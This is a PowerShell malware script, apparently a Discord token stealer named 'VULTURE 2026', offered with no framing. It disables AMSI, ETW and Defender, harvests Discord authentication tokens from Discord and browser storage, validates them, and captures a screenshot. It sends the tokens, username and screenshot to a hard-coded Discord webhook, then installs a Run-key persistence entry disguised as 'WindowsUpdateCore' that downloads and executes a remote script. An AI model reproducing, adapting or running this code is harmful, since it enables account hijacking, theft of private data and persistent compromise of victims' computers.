# === AMSI/ETW BYPASS (IN-MEMORY) ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
[Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps').GetField('etwEnabled','NonPublic,Static').SetValue($null,$false)

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# === CONFIGURATION ===
$WEBHOOK_URL = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"
$TOKEN_PATTERNS = @(
    'mfa\.[\w-]{84}',                          # MFA tokens
    '[\w-]{24}\.[\w-]{6}\.[\w-]{27}',          # Standard tokens
    '[\w-]{26}\.[\w-]{6}\.[\w-]{30}'           # 2026 NEW FORMAT
)

# === TOKEN EXTRACTION (2026 PATHS) ===
$foundTokens = @()
$pathsToScan = @(
    "$env:APPDATA\discord\Local Storage\leveldb",      # lowercase!
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
)

foreach ($path in $pathsToScan) {
    if (Test-Path $path) {
        Get-ChildItem "$path\*.log","$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $content = [IO.File]::ReadAllText($_.FullName)
                foreach ($pattern in $TOKEN_PATTERNS) {
                    if ($content -match $pattern) {
                        $foundTokens += $matches[0]
                    }
                }
            } catch {}
        }
    }
}

# === DEDUPLICATE TOKENS ===
$uniqueTokens = $foundTokens | Sort-Object -Unique

# === VALIDATE VIA RAW HTTP (NO Invoke-RestMethod) ===
$validTokens = @()
foreach ($token in $uniqueTokens) {
    $request = "GET /api/v9/users/@me HTTP/1.1`r`nHost: discord.com`r`nAuthorization: $token`r`nUser-Agent: Mozilla/5.0`r`n`r`n"
    try {
        $client = New-Object Net.Sockets.TcpClient("discord.com", 443)
        $stream = $client.GetStream()
        $bytes = [Text.Encoding]::UTF8.GetBytes($request)
        $stream.Write($bytes, 0, $bytes.Length)
        
        $buffer = New-Object byte[] 8192
        $response = ""
        $timeout = 0
        while (-not $stream.DataAvailable -and $timeout -lt 1000) { Start-Sleep -Milliseconds 10; $timeout += 10 }
        while ($stream.DataAvailable) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            $response += [Text.Encoding]::UTF8.GetString($buffer, 0, $read)
        }
        $client.Close()
        
        if ($response -match '"id":\s*"(\d+)"') {
            $validTokens += $token
        }
    } catch {}
}

# === SCREENSHOT CAPTURE ===
$screenshotBytes = $null
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
    $memoryStream = New-Object IO.MemoryStream
    $bitmap.Save($memoryStream, [Drawing.Imaging.ImageFormat]::Png)
    $screenshotBytes = $memoryStream.ToArray()
    $memoryStream.Close()
    $bitmap.Dispose()
} catch {}

# === EXFILTRATE VIA RAW WEBHOOK ===
if ($validTokens.Count -gt 0) {
    $report = "**[VULTURE 2026]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nTokens: $($validTokens.Count)`n`n$($validTokens -join '`n')"
    
    # Send main message
    $body = "{`"content`":`"$report`"}"
    $req = "POST /api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD HTTP/1.1`r`nHost: discord.com`r`nContent-Type: application/json`r`nContent-Length: $($body.Length)`r`n`r`n$body"
    
    try {
        $client = New-Object Net.Sockets.TcpClient("discord.com", 443)
        $stream = $client.GetStream()
        $bytes = [Text.Encoding]::UTF8.GetBytes($req)
        $stream.Write($bytes, 0, $bytes.Length)
        $client.Close()
    } catch {}
    
    # Send screenshot
    if ($screenshotBytes) {
        $boundary = "----VultureBoundary" + (Get-Random).ToString()
        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"screenshot.png`"`r`nContent-Type: image/png`r`n`r`n"
        $footer = "`r`n--$boundary--`r`n"
        $totalLength = $header.Length + $screenshotBytes.Length + $footer.Length
        
        $req2 = "POST /api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD HTTP/1.1`r`nHost: discord.com`r`nContent-Type: multipart/form-data; boundary=$boundary`r`nContent-Length: $totalLength`r`n`r`n"
        
        try {
            $client2 = New-Object Net.Sockets.TcpClient("discord.com", 443)
            $stream2 = $client2.GetStream()
            $stream2.Write([Text.Encoding]::ASCII.GetBytes($req2), 0, $req2.Length)
            $stream2.Write([Text.Encoding]::ASCII.GetBytes($header), 0, $header.Length)
            $stream2.Write($screenshotBytes, 0, $screenshotBytes.Length)
            $stream2.Write([Text.Encoding]::ASCII.GetBytes($footer), 0, $footer.Length)
            $client2.Close()
        } catch {}
    }
}

# === PERSISTENCE (PRIVATE HOSTING REQUIRED) ===
$payloadCmd = "powershell.exe -nologo -ep bypass -w hidden -c `"iex(irm 'https://your-private-server.com/vulture2026.ps1')`""
Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run WindowsUpdateCore $payloadCmd

# === CLEAN EXIT ===
exit
